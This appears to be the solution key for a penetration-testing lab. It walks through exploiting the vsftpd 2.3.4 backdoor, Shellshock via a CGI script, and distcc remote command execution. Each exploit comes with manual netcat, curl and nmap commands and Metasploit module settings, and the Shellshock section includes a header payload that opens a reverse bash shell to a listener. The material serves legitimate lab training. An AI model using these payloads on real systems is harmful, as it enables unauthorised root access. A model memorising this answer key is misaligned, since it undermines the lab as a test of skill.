# msf-lab — Solution

**Ports:** `2122` (FTP/vsftpd), `6200` (backdoor shell), `8888` (HTTP/Shellshock), `3632` (distcc)

---

## Vulnerability 1: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

Any username containing `:)` causes vsftpd to open a root shell on port 6200.

### Manual exploitation
```bash
# Step 1 — Trigger the backdoor (send the smiley username)
nc <target> 2122
# Type:  USER evil:)
# Type:  PASS anything
# (connection hangs — backdoor is spawning)

# Step 2 — Connect to the backdoor shell on port 6200
nc <target> 6200
id   # uid=0(root)
```

### Metasploit
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
set RPORT 2122
run
```

---

## Vulnerability 2: Shellshock CGI (CVE-2014-6271)

Any header on `/cgi-bin/*` containing `() { :;}; <cmd>` is executed server-side as root.

### Manual exploitation
```bash
# Step 1 — Confirm RCE (response body will be blank \n on trigger, "Hello World" otherwise)
curl -v http://<target>:8888/cgi-bin/status.cgi \
  -H 'User-Agent: () { :;}; echo; id'

# Step 2 — Reverse shell
curl http://<target>:8888/cgi-bin/status.cgi \
  -H 'User-Agent: () { :;}; bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```
Start your listener first: `nc -lvnp 4444`

The response body comes back as a single blank line when triggered. The shell connects back out-of-band.

### Metasploit
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set RPORT 8888
set TARGETURI /cgi-bin/status.cgi
set LHOST <your_ip>
run
```

---

## Vulnerability 3: distcc RCE (CVE-2004-2687)

distcc on port 3632 executes arbitrary commands on the server.

### Manual exploitation
```bash
# distcc protocol: DIST00000001 ARGC... ARGV... DOTI...
# Easiest via nmap script or MSF

nmap -p 3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='id'" <target>
```

### Metasploit
```
use exploit/unix/misc/distcc_exec
set RHOSTS <target>
set LHOST <your_ip>
run
```

---

## Quick-win order
1. vsftpd backdoor → instant root shell on port 6200
2. Shellshock → root shell via HTTP header injection
3. distcc → code execution via compiler daemon
